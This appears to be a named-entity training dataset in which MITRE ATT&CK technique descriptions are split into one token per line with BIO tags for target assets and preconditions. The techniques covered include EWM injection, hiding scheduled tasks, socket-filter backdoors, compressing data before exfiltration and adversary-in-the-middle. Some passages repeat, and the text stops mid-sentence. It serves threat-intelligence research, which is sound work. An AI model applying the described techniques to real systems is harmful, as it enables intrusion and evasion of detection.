Adversaries O
may O
inject O
malicious O
code O
into O
process B-TARGET_ASSET
via O
Extra B-TARGET_ASSET
Window I-TARGET_ASSET
Memory I-TARGET_ASSET
( I-TARGET_ASSET
EWM I-TARGET_ASSET
) I-TARGET_ASSET
in O
order O
to O
evade O
process-based O
defenses O
as O
well O
as O
possibly O
elevate O
privileges O
. O 

EWM O
injection O
is O
a O
method O
of O
executing O
arbitrary O
code O
in O
the O
address B-TARGET_ASSET
space I-TARGET_ASSET
of O
a O
separate O
live O
process B-TARGET_ASSET
. O 

Before O
creating O
a O
window O
, O
graphical O
Windows-based O
processes B-TARGET_ASSET
must O
prescribe O
to O
or O
register O
a O
windows B-TARGET_ASSET
class I-TARGET_ASSET
, O
which O
stipulate O
appearance O
and O
behavior O
( O
via O
windows O
procedures O
, O
which O
are O
functions O
that O
handle O
input/output O
of O
data O
) O
. O 

(Citation: O
Microsoft O
Window O
Classes) O
Registration O
of O
new O
windows B-TARGET_ASSET
classes I-TARGET_ASSET
can O
include O
a O
request O
for O
up O
to O
40 O
bytes O
of O
EWM B-TARGET_ASSET
to O
be O
appended O
to O
the O
allocated B-TARGET_ASSET
memory I-TARGET_ASSET
of O
each O
instance O
of O
that O
class B-TARGET_ASSET
. O 

This O
EWM B-TARGET_ASSET
is O
intended O
to O
store O
data O
specific O
to O
that O
window O
and O
has O
specific O
application B-TARGET_ASSET
programming I-TARGET_ASSET
interface I-TARGET_ASSET
( I-TARGET_ASSET
API I-TARGET_ASSET
) I-TARGET_ASSET
functions I-TARGET_ASSET
to O
set O
and O
get O
its O
value O
. O 

(Citation: O
Microsoft O
GetWindowLong O
function) O
(Citation: O
Microsoft O
SetWindowLong O
function) O

Although O
small B-PRECON
, O
the O
EWM B-TARGET_ASSET
is O
large O
enough O
to O
store O
a O
32-bit O
pointer O
and O
is O
often O
used O
to O
point O
to O
a O
windows O
procedure O
. O 

Malware O
may O
possibly O
utilize O
this O
memory B-TARGET_ASSET
location I-TARGET_ASSET
in O
part O
of O
an O
attack O
chain O
that O
includes O
writing O
code O
to O
shared B-PRECON
sections B-TARGET_ASSET
of O
the O
process’s B-TARGET_ASSET
memory I-TARGET_ASSET
, O
placing O
a O
pointer O
to O
the O
code O
in O
EWM B-TARGET_ASSET
, O
then O
invoking O
execution O
by O
returning O
execution O
control O
to O
the O
address O
in O
the O
process’s B-TARGET_ASSET
EWM I-TARGET_ASSET
. O 

Execution O
granted O
through O
EWM O
injection O
may O
allow O
access O
to O
both O
the O
target O
process's B-TARGET_ASSET
memory I-TARGET_ASSET
and O
possibly O
elevated O
privileges O
. O 

Writing O
payloads O
to O
shared B-PRECON
sections B-TARGET_ASSET
also O
avoids O
the O
use O
of O
highly O
monitored O
API B-TARGET_ASSET
calls I-TARGET_ASSET
such O
as O
<code>WriteProcessMemory</code> O
and O
<code>CreateRemoteThread</code> O
. O 

(Citation: O
Elastic O
Process O
Injection O
July O
2017) O
More O
sophisticated O
malware O
samples O
may O
also O
potentially O
bypass O
protection B-TARGET_ASSET
mechanisms I-TARGET_ASSET
such O
as O
data O
execution O
prevention O
(DEP) O
by O
triggering O
a O
combination O
of O
windows O
procedures O
and O
other O
system O
functions O
that O
will O
rewrite O
the O
malicious O
payload O
inside O
an O
executable B-PRECON
portion B-TARGET_ASSET
of O
the O
target O
process B-TARGET_ASSET
. O 

(Citation: O
MalwareTech O
Power O
Loader O
Aug O
2013) O
(Citation: O
WeLiveSecurity O
Gapz O
and O
Redyms O
Mar O
2013) O

Running O
code O
in O
the O
context O
of O
another O
process B-TARGET_ASSET
may O
allow O
access O
to O
the O
process's B-TARGET_ASSET
memory I-TARGET_ASSET
, O
system/network B-TARGET_ASSET
resources I-TARGET_ASSET
, O
and O
possibly O
elevated O
privileges O
. O 

Execution O
via O
EWM O
injection O
may O
also O
evade O
detection O
from O
security B-TARGET_ASSET
products I-TARGET_ASSET
since O
the O
execution O
is O
masked O
under O
a O
legitimate O
process B-TARGET_ASSET
. O 

Adversaries O
may O
abuse O
the O
Windows B-TARGET_ASSET
Task I-TARGET_ASSET
Scheduler I-TARGET_ASSET
to O
perform O
task O
scheduling O
for O
initial O
or O
recurring O
execution O
of O
malicious O
code O
. O 

There O
are O
multiple O
ways O
to O
access O
the O
Task B-TARGET_ASSET
Scheduler I-TARGET_ASSET
in O
Windows O
. O 

The O
[schtasks](https://attack.mitre.org/software/S0111) B-TARGET_ASSET
utility I-TARGET_ASSET
can O
be O
run O
directly O
on O
the O
command O
line O
, O
or O
the O
Task B-TARGET_ASSET
Scheduler I-TARGET_ASSET
can O
be O
opened O
through O
the O
GUI O
within O
the O
Administrator O
Tools O
section O
of O
the O
Control O
Panel.(Citation: O
Stack O
Overflow) O
In O
some O
cases O
, O
adversaries O
have O
used O
a O
.NET B-TARGET_ASSET
wrapper I-TARGET_ASSET
for O
the O
Windows B-TARGET_ASSET
Task I-TARGET_ASSET
Scheduler I-TARGET_ASSET
, O
and O
alternatively O
, O
adversaries O
have O
used O
the O
Windows B-TARGET_ASSET
netapi32 I-TARGET_ASSET
library I-TARGET_ASSET
and O
[Windows B-TARGET_ASSET
Management I-TARGET_ASSET
Instrumentation](https://attack.mitre.org/techniques/T1047) I-TARGET_ASSET
( I-TARGET_ASSET
WMI I-TARGET_ASSET
) O
to O
create O
a O
scheduled O
task O
. O 

Adversaries O
may O
also O
utilize O
the O
Powershell B-TARGET_ASSET
Cmdlet I-TARGET_ASSET
`Invoke-CimMethod` O
, O
which O
leverages O
WMI B-TARGET_ASSET
class I-TARGET_ASSET
`PS_ScheduledTask` O
to O
create O
a O
scheduled O
task O
via O
an O
XML O
path.(Citation: O
Red O
Canary O
- O
Atomic O
Red O
Team) O

An O
adversary O
may O
use O
Windows B-TARGET_ASSET
Task I-TARGET_ASSET
Scheduler I-TARGET_ASSET
to O
execute O
programs B-TARGET_ASSET
at O
system B-PRECON
startup I-PRECON
or O
on O
a O
scheduled B-PRECON
basis I-PRECON
for O
persistence O
. O 

The O
Windows B-TARGET_ASSET
Task I-TARGET_ASSET
Scheduler I-TARGET_ASSET
can O
also O
be O
abused O
to O
conduct O
remote O
Execution O
as O
part O
of O
Lateral O
Movement O
and/or O
to O
run O
a O
process B-TARGET_ASSET
under O
the O
context O
of O
a O
specified O
account O
(such O
as O
SYSTEM) O
. O 

Similar O
to O
[System O
Binary O
Proxy O
Execution](https://attack.mitre.org/techniques/T1218) O
, O
adversaries O
have O
also O
abused O
the O
Windows B-TARGET_ASSET
Task I-TARGET_ASSET
Scheduler I-TARGET_ASSET
to O
potentially O
mask O
one-time O
execution O
under O
signed/trusted O
system O
processes O
. O 

(Citation: O
ProofPoint O
Serpent) O

Adversaries O
may O
also O
create O
""hidden"" O
scheduled B-TARGET_ASSET
tasks I-TARGET_ASSET
(i.e. O 

[Hide O
Artifacts](https://attack.mitre.org/techniques/T1564)) O
that O
may O
not O
be O
visible B-PRECON
to O
defender O
tools O
and O
manual O
queries O
used O
to O
enumerate O
tasks O
. O 

Specifically O
, O
an O
adversary O
may O
hide O
a O
task B-TARGET_ASSET
from O
`schtasks O
/query` O
and O
the O
Task B-TARGET_ASSET
Scheduler I-TARGET_ASSET
by O
deleting O
the O
associated O
Security B-TARGET_ASSET
Descriptor I-TARGET_ASSET
( I-TARGET_ASSET
SD I-TARGET_ASSET
) I-TARGET_ASSET
registry I-TARGET_ASSET
value I-TARGET_ASSET
(where O
deletion O
of O
this O
value O
must O
be O
completed O
using O
SYSTEM O
permissions). O 

(Citation: O
SigmaHQ)(Citation: O
Tarrask O
scheduled O
task) O
. O 

Adversaries O
may O
also O
employ O
alternate O
methods O
to O
hide O
tasks B-TARGET_ASSET
, O
such O
as O
altering O
the O
metadata B-TARGET_ASSET
(e.g., O
`Index` O
value) O
within O
associated O
registry B-TARGET_ASSET
keys I-TARGET_ASSET
. O 

(Citation: O
Defending O
Against O
Scheduled O
Task O
Attacks O
in O
Windows O
Environments) O

Adversaries O
may O
attach O
filters B-TARGET_ASSET
to O
a O
network B-TARGET_ASSET
socket I-TARGET_ASSET
to O
monitor O
then O
activate O
backdoors O
used O
for O
persistence O
or O
command O
and O
control O
. O 

With O
elevated O
permissions O
, O
adversaries O
can O
use O
features O
such O
as O
the O
`libpcap` B-TARGET_ASSET
library I-TARGET_ASSET
to O
open O
sockets B-TARGET_ASSET
and O
install O
filters B-TARGET_ASSET
to O
allow O
or O
disallow O
certain O
types O
of O
data O
to O
come O
through O
the O
socket B-TARGET_ASSET
. O 

The O
filter B-TARGET_ASSET
may O
apply O
to O
all O
traffic O
passing O
through O
the O
specified O
network B-TARGET_ASSET
interface I-TARGET_ASSET
(or O
every O
interface O
if O
not O
specified) O
. O 

When O
the O
network B-TARGET_ASSET
interface I-TARGET_ASSET
receives O
a O
packet O
matching O
the O
filter O
criteria O
, O
additional O
actions O
can O
be O
triggered O
on O
the O
host B-TARGET_ASSET
, O
such O
as O
activation O
of O
a O
reverse O
shell O
. O 

To O
establish O
a O
connection O
, O
an O
adversary O
sends O
a O
crafted O
packet O
to O
the O
targeted O
host B-TARGET_ASSET
that O
matches O
the O
installed B-PRECON
filter B-TARGET_ASSET
criteria O
. O 

(Citation: O
haking9 O
libpcap O
network O
sniffing) O
Adversaries O
have O
used O
these O
socket B-TARGET_ASSET
filters I-TARGET_ASSET
to O
trigger O
the O
installation O
of O
implants B-TARGET_ASSET
, O
conduct O
ping O
backs O
, O
and O
to O
invoke O
command B-TARGET_ASSET
shells I-TARGET_ASSET
. O 

Communication O
with O
these O
socket B-TARGET_ASSET
filters I-TARGET_ASSET
may O
also O
be O
used O
in O
conjunction O
with O
[Protocol O
Tunneling](https://attack.mitre.org/techniques/T1572) O
. O 

(Citation: O
exatrack O
bpf O
filters O
passive O
backdoors)(Citation: O
Leonardo O
Turla O
Penquin O
May O
2020) O

Filters B-TARGET_ASSET
can O
be O
installed O
on O
any O
Unix-like O
platform B-TARGET_ASSET
with O
`libpcap` B-TARGET_ASSET
installed B-PRECON
or O
on O
Windows O
hosts B-TARGET_ASSET
using O
`Winpcap` B-TARGET_ASSET
. O 

Adversaries O
may O
use O
either O
`libpcap` B-TARGET_ASSET
with O
`pcap_setfilter` O
or O
the O
standard O
library B-TARGET_ASSET
function I-TARGET_ASSET
`setsockopt` O
with O
`SO_ATTACH_FILTER` O
options O
. O 

Since O
the O
socket B-TARGET_ASSET
connection I-TARGET_ASSET
is O
not B-PRECON
active I-PRECON
until O
the O
packet O
is O
received O
, O
this O
behavior O
may O
be O
difficult O
to O
detect O
due O
to O
the O
lack O
of O
activity O
on O
a O
host O
, O
low O
CPU O
overhead O
, O
and O
limited O
visibility O
into O
raw O
socket B-TARGET_ASSET
usage O
. O 

If O
a O
malicious B-TARGET_ASSET
tool I-TARGET_ASSET
is O
detected B-PRECON
and I-PRECON
quarantined I-PRECON
or O
otherwise O
curtailed O
, O
an O
adversary O
may O
be O
able O
to O
determine O
why O
the O
malicious B-TARGET_ASSET
tool I-TARGET_ASSET
was O
detected O
(the O
indicator) O
, O
modify O
the O
tool B-TARGET_ASSET
by O
removing O
the O
indicator O
, O
and O
use O
the O
updated O
version O
that O
is O
no O
longer O
detected O
by O
the O
target's O
defensive B-TARGET_ASSET
systems I-TARGET_ASSET
or O
subsequent O
targets O
that O
may O
use O
similar O
systems B-TARGET_ASSET
. O 

A O
good O
example O
of O
this O
is O
when O
malware B-TARGET_ASSET
is O
detected B-PRECON
with I-PRECON
a I-PRECON
file B-TARGET_ASSET
signature I-TARGET_ASSET
and O
quarantined B-PRECON
by O
anti-virus B-TARGET_ASSET
software I-TARGET_ASSET
. O 

An O
adversary O
who O
can O
determine O
that O
the O
malware B-TARGET_ASSET
was O
quarantined B-PRECON
because O
of O
its O
file B-TARGET_ASSET
signature I-TARGET_ASSET
may O
use O
[Software O
Packing](https://attack.mitre.org/techniques/T1045) O
or O
otherwise O
modify O
the O
file B-TARGET_ASSET
so O
it O
has O
a O
different O
signature O
, O
and O
then O
re-use O
the O
malware B-TARGET_ASSET
. O 

Adversaries O
may O
use O
utilities B-TARGET_ASSET
to O
compress O
and/or O
encrypt O
collected O
data B-TARGET_ASSET
prior O
to O
exfiltration O
. O 

Many O
utilities B-TARGET_ASSET
include O
functionalities O
to O
compress O
, O
encrypt O
, O
or O
otherwise O
package O
data B-TARGET_ASSET
into O
a O
format O
that O
is O
easier/more O
secure O
to O
transport O
. O 

Adversaries O
may O
abuse O
various O
utilities B-TARGET_ASSET
to O
compress O
or O
encrypt O
data B-TARGET_ASSET
before O
exfiltration O
. O 

Some O
third O
party O
utilities B-TARGET_ASSET
may O
be O
preinstalled B-PRECON
, O
such O
as O
<code>tar</code> O
on O
Linux O
and O
macOS O
or O
<code>zip</code> O
on O
Windows O
systems B-TARGET_ASSET
. O 

On O
Windows O
, O
<code>diantz</code> O
or O
<code> O
makecab</code> O
may O
be O
used O
to O
package O
collected O
files B-TARGET_ASSET
into O
a O
cabinet B-TARGET_ASSET
( I-TARGET_ASSET
.cab I-TARGET_ASSET
) I-TARGET_ASSET
file I-TARGET_ASSET
. O 

<code>diantz</code> O
may O
also O
be O
used O
to O
download O
and O
compress O
files B-TARGET_ASSET
from O
remote O
locations O
(i.e. O 

[Remote O
Data O
Staging](https://attack.mitre.org/techniques/T1074/002)) O
. O 

(Citation: O
diantz.exe_lolbas) O
<code>xcopy</code> O
on O
Windows O
can O
copy O
files B-TARGET_ASSET
and O
directories B-TARGET_ASSET
with O
a O
variety O
of O
options O
. O 

Additionally O
, O
adversaries O
may O
use O
[certutil](https://attack.mitre.org/software/S0160) B-TARGET_ASSET
to O
Base64 O
encode O
collected O
data B-TARGET_ASSET
before O
exfiltration O
. O 

Adversaries O
may O
use O
also O
third O
party O
utilities B-TARGET_ASSET
, O
such O
as O
7-Zip B-TARGET_ASSET
, O
WinRAR B-TARGET_ASSET
, O
and O
WinZip B-TARGET_ASSET
, O
to O
perform O
similar O
activities O
. O 

(Citation: O
7zip O
Homepage)(Citation: O
WinRAR O
Homepage)(Citation: O
WinZip O
Homepage) O

Adversaries O
may O
use O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078) O
to O
remotely O
control O
machines B-TARGET_ASSET
using O
Virtual B-TARGET_ASSET
Network I-TARGET_ASSET
Computing I-TARGET_ASSET
( I-TARGET_ASSET
VNC I-TARGET_ASSET
) I-TARGET_ASSET
. O 

VNC B-TARGET_ASSET
is O
a O
platform-independent O
desktop O
sharing O
system B-TARGET_ASSET
that O
uses O
the O
RFB B-TARGET_ASSET
(“remote I-TARGET_ASSET
framebuffer”) I-TARGET_ASSET
protocol I-TARGET_ASSET
to O
enable O
users O
to O
remotely O
control O
another O
computer’s B-TARGET_ASSET
display I-TARGET_ASSET
by O
relaying O
the O
screen B-TARGET_ASSET
, O
mouse B-TARGET_ASSET
, O
and O
keyboard B-TARGET_ASSET
inputs I-TARGET_ASSET
over O
the O
network B-TARGET_ASSET
. O 

(Citation: O
The O
Remote O
Framebuffer O
Protocol) O

VNC B-TARGET_ASSET
differs O
from O
[Remote B-TARGET_ASSET
Desktop I-TARGET_ASSET
Protocol](https://attack.mitre.org/techniques/T1021/001) I-TARGET_ASSET
as O
VNC B-TARGET_ASSET
is O
screen-sharing O
software B-TARGET_ASSET
rather O
than O
resource-sharing O
software O
. O 

By O
default B-PRECON
, O
VNC B-TARGET_ASSET
uses O
the O
system's O
authentication O
, O
but O
it O
can O
be O
configured B-PRECON
to O
use O
credentials B-TARGET_ASSET
specific O
to O
VNC B-TARGET_ASSET
. O 

(Citation: O
MacOS O
VNC O
software O
for O
Remote O
Desktop)(Citation: O
VNC O
Authentication) O

Adversaries O
may O
abuse O
VNC B-TARGET_ASSET
to O
perform O
malicious O
actions O
as O
the O
logged-on O
user O
such O
as O
opening O
documents B-TARGET_ASSET
, O
downloading O
files B-TARGET_ASSET
, O
and O
running O
arbitrary O
commands O
. O 

An O
adversary O
could O
use O
VNC B-TARGET_ASSET
to O
remotely O
control O
and O
monitor O
a O
system B-TARGET_ASSET
to O
collect O
data O
and O
information O
to O
pivot O
to O
other O
systems B-TARGET_ASSET
within O
the O
network B-TARGET_ASSET
. O 

Specific O
VNC B-TARGET_ASSET
libraries/implementations I-TARGET_ASSET
have O
also O
been O
susceptible B-PRECON
to O
brute O
force O
attacks O
and O
memory O
usage O
exploitation O
. O 

(Citation: O
Hijacking O
VNC)(Citation: O
macOS O
root O
VNC O
login O
without O
authentication)(Citation: O
VNC O
Vulnerabilities)(Citation: O
Offensive O
Security O
VNC O
Authentication O
Check)(Citation: O
Attacking O
VNC O
Servers O
PentestLab)(Citation: O
Havana O
authentication O
bug) O

Adversaries O
may O
attach O
filters B-TARGET_ASSET
to O
a O
network B-TARGET_ASSET
socket I-TARGET_ASSET
to O
monitor O
then O
activate O
backdoors O
used O
for O
persistence O
or O
command O
and O
control O
. O 

With O
elevated B-PRECON
permissions I-PRECON
, O
adversaries O
can O
use O
features O
such O
as O
the O
`libpcap` B-TARGET_ASSET
library I-TARGET_ASSET
to O
open O
sockets B-TARGET_ASSET
and O
install O
filters B-TARGET_ASSET
to O
allow O
or O
disallow O
certain O
types O
of O
data O
to O
come O
through O
the O
socket B-TARGET_ASSET
. O 

The O
filter B-TARGET_ASSET
may O
apply O
to O
all O
traffic O
passing O
through O
the O
specified O
network B-TARGET_ASSET
interface I-TARGET_ASSET
(or O
every O
interface O
if O
not O
specified) O
. O 

When O
the O
network B-TARGET_ASSET
interface I-TARGET_ASSET
receives O
a O
packet O
matching O
the O
filter B-TARGET_ASSET
criteria O
, O
additional O
actions O
can O
be O
triggered O
on O
the O
host B-TARGET_ASSET
, O
such O
as O
activation O
of O
a O
reverse O
shell O
. O 

To O
establish O
a O
connection O
, O
an O
adversary O
sends O
a O
crafted O
packet O
to O
the O
targeted O
host B-TARGET_ASSET
that O
matches O
the O
installed B-PRECON
filter B-TARGET_ASSET
criteria O
. O 

(Citation: O
haking9 O
libpcap O
network O
sniffing) O
Adversaries O
have O
used O
these O
socket B-TARGET_ASSET
filters I-TARGET_ASSET
to O
trigger O
the O
installation O
of O
implants B-TARGET_ASSET
, O
conduct O
ping O
backs O
, O
and O
to O
invoke O
command B-TARGET_ASSET
shells I-TARGET_ASSET
. O 

Communication O
with O
these O
socket B-TARGET_ASSET
filters I-TARGET_ASSET
may O
also O
be O
used O
in O
conjunction O
with O
[Protocol O
Tunneling](https://attack.mitre.org/techniques/T1572) O
. O 

(Citation: O
exatrack O
bpf O
filters O
passive O
backdoors)(Citation: O
Leonardo O
Turla O
Penquin O
May O
2020) O

Filters B-TARGET_ASSET
can O
be O
installed O
on O
any O
Unix-like O
platform B-TARGET_ASSET
with O
`libpcap` B-TARGET_ASSET
installed B-PRECON
or O
on O
Windows O
hosts B-TARGET_ASSET
using O
`Winpcap` B-TARGET_ASSET
. O 

Adversaries O
may O
use O
either O
`libpcap` B-TARGET_ASSET
with O
`pcap_setfilter` O
or O
the O
standard O
library B-TARGET_ASSET
function I-TARGET_ASSET
`setsockopt` O
with O
`SO_ATTACH_FILTER` O
options O
. O 

Since O
the O
socket B-TARGET_ASSET
connection I-TARGET_ASSET
is O
not B-PRECON
active I-PRECON
until O
the O
packet O
is O
received O
, O
this O
behavior O
may O
be O
difficult O
to O
detect O
due O
to O
the O
lack O
of O
activity O
on O
a O
host O
, O
low O
CPU O
overhead O
, O
and O
limited O
visibility O
into O
raw O
socket B-TARGET_ASSET
usage O
. O 

If O
a O
malicious B-TARGET_ASSET
tool I-TARGET_ASSET
is O
detected B-PRECON
and I-PRECON
quarantined I-PRECON
or O
otherwise O
curtailed O
, O
an O
adversary O
may O
be O
able O
to O
determine O
why O
the O
malicious B-TARGET_ASSET
tool I-TARGET_ASSET
was O
detected O
(the O
indicator) O
, O
modify O
the O
tool B-TARGET_ASSET
by O
removing O
the O
indicator O
, O
and O
use O
the O
updated O
version O
that O
is O
no O
longer O
detected O
by O
the O
target's O
defensive B-TARGET_ASSET
systems I-TARGET_ASSET
or O
subsequent O
targets O
that O
may O
use O
similar O
systems B-TARGET_ASSET
. O 

A O
good O
example O
of O
this O
is O
when O
malware B-TARGET_ASSET
is O
detected B-PRECON
with I-PRECON
a I-PRECON
file B-TARGET_ASSET
signature I-TARGET_ASSET
and O
quarantined B-PRECON
by O
anti-virus B-TARGET_ASSET
software I-TARGET_ASSET
. O 

An O
adversary O
who O
can O
determine O
that O
the O
malware B-TARGET_ASSET
was O
quarantined B-PRECON
because O
of O
its O
file B-TARGET_ASSET
signature I-TARGET_ASSET
may O
use O
[Software O
Packing](https://attack.mitre.org/techniques/T1045) O
or O
otherwise O
modify O
the O
file B-TARGET_ASSET
so O
it O
has O
a O
different O
signature O
, O
and O
then O
re-use O
the O
malware B-TARGET_ASSET
. O 

Adversaries O
may O
use O
scripts B-TARGET_ASSET
automatically B-PRECON
executed I-PRECON
at I-PRECON
boot I-PRECON
or I-PRECON
logon I-PRECON
initialization I-PRECON
to O
establish O
persistence O
. O 

(Citation: O
Mandiant O
APT29 O
Eye O
Spy O
Email O
Nov O
22)(Citation: O
Anomali O
Rocke O
March O
2019) O
Initialization B-TARGET_ASSET
scripts I-TARGET_ASSET
can O
be O
used O
to O
perform O
administrative O
functions O
, O
which O
may O
often O
execute O
other O
programs O
or O
send O
information O
to O
an O
internal O
logging B-TARGET_ASSET
server I-TARGET_ASSET
. O 

These O
scripts B-TARGET_ASSET
can O
vary O
based O
on O
operating B-TARGET_ASSET
system I-TARGET_ASSET
and O
whether O
applied O
locally O
or O
remotely O
. O 

Adversaries O
may O
use O
these O
scripts B-TARGET_ASSET
to O
maintain O
persistence O
on O
a O
single O
system B-TARGET_ASSET
. O 

Depending O
on O
the O
access O
configuration O
of O
the O
logon B-TARGET_ASSET
scripts I-TARGET_ASSET
, O
either O
local O
credentials O
or O
an O
administrator O
account O
may O
be O
necessary O
. O 

An O
adversary O
may O
also O
be O
able O
to O
escalate O
their O
privileges O
since O
some O
boot B-TARGET_ASSET
or O
logon B-TARGET_ASSET
initialization I-TARGET_ASSET
scripts I-TARGET_ASSET
run B-PRECON
with I-PRECON
higher I-PRECON
privileges I-PRECON
. O 

Adversaries O
may O
attempt O
to O
position O
themselves O
between O
two O
or O
more O
networked O
devices B-TARGET_ASSET
using O
an O
adversary-in-the-middle O
(AiTM) O
technique O
to O
support O
follow-on O
behaviors O
such O
as O
[Network O
Sniffing](https://attack.mitre.org/techniques/T1040) O
, O
[Transmitted O
Data O
Manipulation](https://attack.mitre.org/techniques/T1565/002) O
, O
or O
replay O
attacks O
([Exploitation O
for O
Credential O
Access](https://attack.mitre.org/techniques/T1212)) O
. O 

By O
abusing O
features O
of O
common O
networking B-TARGET_ASSET
protocols I-TARGET_ASSET
that O
can O
determine O
the O
flow O
of O
network O
traffic B-TARGET_ASSET
(e.g. O 

ARP B-TARGET_ASSET
, O
DNS B-TARGET_ASSET
, O
LLMNR B-TARGET_ASSET
, O
etc.) O
, O
adversaries O
may O
force O
a O
device B-TARGET_ASSET
to O
communicate O
through O
an O
adversary O
controlled O
system B-TARGET_ASSET
so O
they O
can O
collect O
information O
or O
perform O
additional O
actions O
. O 

(Citation: O
Rapid7 O
MiTM O
Basics) O

For O
example O
, O
adversaries O
may O
manipulate O
victim O
DNS B-TARGET_ASSET
settings I-TARGET_ASSET
to O
enable O
other O
malicious O
activities O
such O
as O
preventing/redirecting O
users O
from O
accessing O
legitimate O
sites O
and/or O
pushing O
additional O
malware O
. O 

(Citation: O
ttint_rat)(Citation: O
dns_changer_trojans)(Citation: O
ad_blocker_with_miner) O
Adversaries O
may O
also O
manipulate O
DNS B-TARGET_ASSET
and O
leverage O
their O
position O
in O
order O
to O
intercept O
user O
credentials B-TARGET_ASSET
, O
including O
access B-TARGET_ASSET
tokens I-TARGET_ASSET
([Steal O
Application O
Access O
Token](https://attack.mitre.org/techniques/T1528)) O
and O
session B-TARGET_ASSET
cookies I-TARGET_ASSET
([Steal O
Web O
Session O
Cookie](https://attack.mitre.org/techniques/T1539)) O
. O 

(Citation: O
volexity_0day_sophos_FW)(Citation: O
Token O
tactics) O
[Downgrade O
Attack](https://attack.mitre.org/techniques/T1562/010)s O
can O
also O
be O
used O
to O
establish O
an O
AiTM O
position O
, O
such O
as O
by O
negotiating O
a O
less B-PRECON
secure I-PRECON
, O
deprecated B-PRECON
, O
or O
weaker B-PRECON
version O
of O
communication B-TARGET_ASSET
protocol I-TARGET_ASSET
(SSL/TLS) O
or O
encryption B-TARGET_ASSET
algorithm I-TARGET_ASSET
. O 

(Citation: O
mitm_tls_downgrade_att)(Citation: O
taxonomy_downgrade_att_tls)(Citation: O
tlseminar_downgrade_att) O

Adversaries O
may O
also O
leverage O
the O
AiTM O
position O
to O
attempt O
to O
monitor O
and/or O
modify O
traffic B-TARGET_ASSET
, O
such O
as O
in O
[Transmitted O
Data O
Manipulation](https://attack.mitre.org/techniques/T1565/002) O
. O 

Adversaries O
can O
setup O
a O
position O
similar O
to O
AiTM O
to O
prevent O
traffic B-TARGET_ASSET
from O
flowing O
to O
the O
appropriate O
destination O
, O
potentially O
to O
[Impair O
Defenses](https://attack.mitre.org/techniques/T1562) O
and/or O
in O
support O
of O
a O
[Network O
Denial O
of O
Service](https://attack.mitre.org/techniques/T1498) O
. O 

Adversaries O
may O
attempt O
to O
identify O
the O
primary O
user O
, O
currently O
logged O
in O
user O
, O
set O
of O
users O
that O
commonly O
uses O
a O
system B-TARGET_ASSET
, O
or O
whether O
a O
user O
is O
actively O
using O
the O
system B-TARGET_ASSET
. O 

They O
may O
do O
this O
, O
for O
example O
, O
by O
retrieving O
account B-TARGET_ASSET
usernames I-TARGET_ASSET
or O
by O
using O
[OS B-TARGET_ASSET
Credential I-TARGET_ASSET
Dumping](https://attack.mitre.org/techniques/T1003) I-TARGET_ASSET
. O 

The O
information O
may O
be O
collected O
in O
a O
number O
of O
different O
ways O
using O
other O
Discovery O
techniques O
, O
because O
user O
and O
username O
details O
are O
prevalent O
throughout O
a O
system B-TARGET_ASSET
and O
include O
running O
process O
ownership O
, O
file/directory O
ownership O
, O
session O
information O
, O
and O
system B-TARGET_ASSET
logs I-TARGET_ASSET
. O 

Adversaries O
may O
use O
the O
information O
from O
[System O
Owner/User O
Discovery](https://attack.mitre.org/techniques/T1033) O
during O
automated O
discovery O
to O
shape O
follow-on O
behaviors O
, O
including O
whether O
or O
not O
the O
adversary O
fully O
infects O
the O
target O
and/or O
attempts O
specific O
actions O
. O 

Various O
utilities B-TARGET_ASSET
and O
commands O
may O
acquire O
this O
information O
, O
including O
<code>whoami</code> O
. O 

In O
macOS O
and O
Linux O
, O
the O
currently O
logged O
in O
user O
can O
be O
identified O
with O
<code>w</code> O
and O
<code>who</code> O
. O 

On O
macOS O
the O
<code>dscl O
. O 

list O
/Users O
| O
grep O
-v O
'_'</code> O
command O
can O
also O
be O
used O
to O
enumerate O
user O
accounts B-TARGET_ASSET
. O 

Environment B-TARGET_ASSET
variables I-TARGET_ASSET
, O
such O
as O
<code>%USERNAME%</code> O
and O
<code>$USER</code> O
, O
may O
also O
be O
used O
to O
access O
this O
information O
. O 

On O
network B-TARGET_ASSET
devices I-TARGET_ASSET
, O
[Network B-TARGET_ASSET
Device I-TARGET_ASSET
CLI](https://attack.mitre.org/techniques/T1059/008) I-TARGET_ASSET
commands O
such O
as O
`show O
users` O
and O
`show O
ssh` O
can O
be O
used O
to O
display O
users O
currently O
logged O
into O
the O
device B-TARGET_ASSET
. O 

(Citation: O
show_ssh_users_cmd_cisco)(Citation: O
US-CERT O
TA18-106A O
Network O
Infrastructure O
Devices O
2018) O

Adversaries O
may O
buy O
, O
lease O
, O
rent O
, O
or O
obtain O
infrastructure B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

A O
wide O
variety O
of O
infrastructure B-TARGET_ASSET
exists O
for O
hosting O
and O
orchestrating O
adversary O
operations O
. O 

Infrastructure B-TARGET_ASSET
solutions I-TARGET_ASSET
include O
physical O
or O
cloud O
servers B-TARGET_ASSET
, O
domains B-TARGET_ASSET
, O
and O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
. O 

(Citation: O
TrendmicroHideoutsLease) O
Some O
infrastructure B-TARGET_ASSET
providers I-TARGET_ASSET
offer O
free B-PRECON
trial I-PRECON
periods I-PRECON
, O
enabling O
infrastructure B-TARGET_ASSET
acquisition O
at O
limited O
to O
no O
cost O
. O 

(Citation: O
Free O
Trial O
PurpleUrchin) O
Additionally O
, O
botnets B-TARGET_ASSET
are O
available O
for O
rent O
or O
purchase O
. O 

Use O
of O
these O
infrastructure B-TARGET_ASSET
solutions I-TARGET_ASSET
allows O
adversaries O
to O
stage O
, O
launch O
, O
and O
execute O
operations O
. O 

Solutions O
may O
help O
adversary O
operations O
blend O
in O
with O
traffic O
that O
is O
seen O
as O
normal O
, O
such O
as O
contacting O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
or O
acquiring O
infrastructure B-TARGET_ASSET
to O
support O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
, O
including O
from O
residential O
proxy B-TARGET_ASSET
services I-TARGET_ASSET
. O 

(Citation: O
amnesty_nso_pegasus)(Citation: O
FBI O
Proxies O
Credential O
Stuffing)(Citation: O
Mandiant O
APT29 O
Microsoft O
365 O
2022) O
Depending O
on O
the O
implementation O
, O
adversaries O
may O
use O
infrastructure B-TARGET_ASSET
that O
makes O
it O
difficult O
to O
physically O
tie O
back O
to O
them O
as O
well O
as O
utilize O
infrastructure B-TARGET_ASSET
that O
can O
be O
rapidly B-PRECON
provisioned I-PRECON
, O
modified B-PRECON
, O
and O
shut B-PRECON
down I-PRECON
. O 

Adversaries O
may O
abuse O
